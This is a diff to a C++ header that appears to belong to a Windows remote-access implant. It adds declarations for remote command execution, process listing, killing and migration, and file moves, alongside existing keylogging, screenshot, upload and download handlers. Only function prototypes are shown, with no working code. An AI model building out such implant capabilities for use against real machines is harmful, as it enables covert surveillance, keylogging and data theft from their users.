@@ -3,6 +3,7 @@
 
 #include <windows.h>
 #include <winhttp.h>
+#include <psapi.h>
 #include <shlwapi.h>
 #include <strsafe.h>
 #include <string>
@@ -33,14 +34,22 @@ std::wstring ExecuteTaskDownload(
 	const std::wstring& wSrc,
 	const std::wstring& wDest
 );
+std::wstring ExecuteTaskExecute(const std::wstring& cmd);
 std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime);
+std::wstring ExecuteTaskKill();
 std::wstring ExecuteTaskLs(const std::wstring& wDir);
+std::wstring ExecuteTaskMigrate(const std::wstring& wPid);
 std::wstring ExecuteTaskMkdir(const std::wstring& wDir);
+std::wstring ExecuteTaskMv(
+	const std::wstring& wSrc,
+	const std::wstring& wDest
+);
+std::wstring ExecuteTaskPs();
+std::wstring ExecuteTaskPsKill(const std::wstring& wPid);
 std::wstring ExecuteTaskPwd();
 std::wstring ExecuteTaskRm(const std::wstring& wFile);
 std::wstring ExecuteTaskRmdir(const std::wstring& wDir);
 std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow);
-std::wstring ExecuteTaskShell(const std::wstring& cmd);
 std::wstring ExecuteTaskSleep(const std::wstring& wSleepTime, INT &nSleep);
 std::wstring ExecuteTaskUpload(
     HINTERNET hConnect,
